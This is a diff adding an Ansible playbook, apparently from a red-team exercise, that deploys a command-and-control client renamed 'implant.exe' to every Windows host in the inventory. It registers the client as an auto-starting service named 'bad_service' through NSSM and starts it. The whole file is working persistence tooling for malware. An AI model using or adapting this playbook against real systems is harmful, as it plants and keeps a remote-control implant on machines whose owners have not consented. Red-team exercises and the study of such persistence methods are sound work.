@@ -1,0 +1,41 @@
+---
+-   name: Deploy script as Service
+    hosts: all
+    vars:
+      service_name: "bad_service"
+      service_directory: "C://Windows/BadService"
+      service_script: "{{ service_directory }}\\implant.exe"
+      local_file: "/home/redteam/310Infragroup7nyameow/Matt_tool/c2_programs/Client_C2.py"
+      nssm_exe: "{{ service_directory }}\\nssm.exe"
+      local_nssm: "/home/redteam/310Infragroup7nyameow/Matt_tool/nssm.exe"
+
+    tasks:
+      - name: Make sure the directory exists
+        ansible.windows.win_file:
+          path: "{{ service_directory }}"
+          state: directory
+
+      - name: Copy script over
+        ansible.windows.win_copy:
+          src: "{{ local_file }}"
+          dest: "{{ service_script }}"
+
+      - name: Copy nssm over
+        ansible.windows.win_copy:
+          src: "{{ local_nssm }}"
+          dest: "{{ nssm_exe }}"
+
+      - name: Install service
+        ansible.windows.win_shell: |
+          & "{{ nssm_exe }}" install "{{ service_name }}" "{{ service_script }}"
+          & "{{ nssm_exe }}" set "{{ service_name }}" AppDirectory "{{ service_directory }}"
+
+      - name: Set service to auto start
+        ansible.windows.win_service:
+          name: "{{ service_name }}"
+          start_mode: auto
+
+      - name: Start Service
+        ansible.windows.win_service:
+          name: "{{ service_name }}"
+          state: started
